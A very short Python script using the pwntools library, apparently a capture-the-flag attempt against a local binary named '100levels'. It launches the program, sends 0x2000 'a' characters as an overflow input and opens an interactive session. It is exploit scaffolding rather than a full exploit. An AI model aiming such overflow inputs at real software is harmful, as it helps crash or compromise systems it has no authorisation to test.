from pwn import *

sh = process("100levels")

sh.sendline("a"*0x2000)

sh.interactive()
